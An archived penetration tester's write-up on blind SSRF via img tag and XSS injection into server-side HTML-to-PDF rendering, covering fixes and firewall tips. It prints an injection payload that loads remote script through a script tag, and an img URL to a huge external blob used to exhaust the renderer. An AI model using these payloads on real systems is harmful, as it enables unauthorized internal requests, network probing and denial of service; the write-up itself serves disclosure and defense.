# Blind SSRF due to img tag injection in page form

- **Source URL:** https://medium.com/@imhunterand/blind-ssrf-due-to-img-tag-injection-in-page-form-3938c6ea032?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20221211104554/https://medium.com/@imhunterand/blind-ssrf-due-to-img-tag-injection-in-page-form-3938c6ea032
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/65 (id 65)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Blind SSRF due to img tag injection in page form

Today we’re going to talk about SSRF attack that allows hackers to send any network requests from the back-end server by using \<img> tags.

I came across this vulnerability during penetration testing conducted for two separate projects. Screenshots are taken right out of testing reports. Any confidential data is hidden.

# Attack description

Definition: a server sends random network requests during PDF document generation

Description: users generated a PDF document from a fully rendered HTML page with all external resources. The document contained data users had filled in. We can put our external resources in a server rendering without being particularly careful in request filtering. Let’s say it will be [it-band.by/10gb.blob](https://it-band.by/10gb.blob) (supposedly it weights 10 Gb).

# The worst-case scenario

1. While the system uploads 100 Gb of data to render several PDF documents at once, a DDoS attack can happen. The system starts experiencing the lack of network resources and memory and it can lead to system down.
2. An attacker can exploit the server for attacking other resources
3. Web application firewalls and balancers are not an obstacle for an attacker who has internal IP addresses of external servers to use for direct attacks.

Risk evaluation (**Likelihood\*Impact**): Medium(5)\*High(7)=High(35) for both systems the risk was high anyway, though with different rates.

# Good to know:

1. System #1 used wkhtmltopdf to render html2pdf. System #2 launched Firefox to open the page and made a screenshot. In both cases, systems rendered pages, run the code there and then generated PDF.
2. Both systems used server-side XSS prevention but instead of escaping internal data they used HTML purifier. This code validation tool filtered iframe, scripts, css, forms, etc. but didn’t detect img src=”https://it-band.by/10Gb.blob?t=12345.1"/ as malicious code.

# Steps

1\. Create such file and attempt to inject it

2\. Find vulnerable fields

*System #1. We managed to insert only one \<img> tab*

3\. Generate PDF

4\. Go to a server and check if it had sent any requests for a huge 10Gb.blob

*System #1. We get a server IP address and a program that generated PDF. With this IP, Nmap identified one more open port that hasn’t been noticed before.*

Summary. Both systems are now fixed. Instead of HTML purifying, system #1 now performs escaping during user data processing and PDF generation. System #2 during user data processing cuts out any absolute links to external resources.

*Updated: before the article publication, I found new cases to review.*

So-called System #3 failed this vulnerability protection in two places: through HTML and CSS injections.

# Summary for System #3

1. We’ve got server addresses that perform rendering and the browser they use for it — HeadlessChrome, in this case.
2. One PDF file generation took about 5 min, afterward, the browser failed. Imagine what would happen if to send 10 requests like this. Servers that perform generation would simply stop processing other users’ requests.

System #4.SSRF attack was performed through XSS (instead of \<img> tag). During rendering a payload occurred, and the server sent a random chunk of JavaScript when PDF was loading. In opposite to previous cases, it opened possibilities to arrange more complicated attacks on other systems.

My payload:

`D<b onmouseover=alert(1)>e</b>""&|;$'\!--#@\ć'e123456"><script src=https://[link to js]></script>d`
# Tips

- It’s recommended to create Firewall rules for both internal and external traffic. Another option is to separate a network and servers to cut off any external accesses.
- If you find out even the smallest vulnerability think of the worst-case scenarios of the impact it may have on business. A client gets worried about possible risks and potential threats to a business. Technical issues are not their thing.

*Andri HU, Penetration Tester, OSCP/OSEP, Application Security Engineer (EpicGames)*
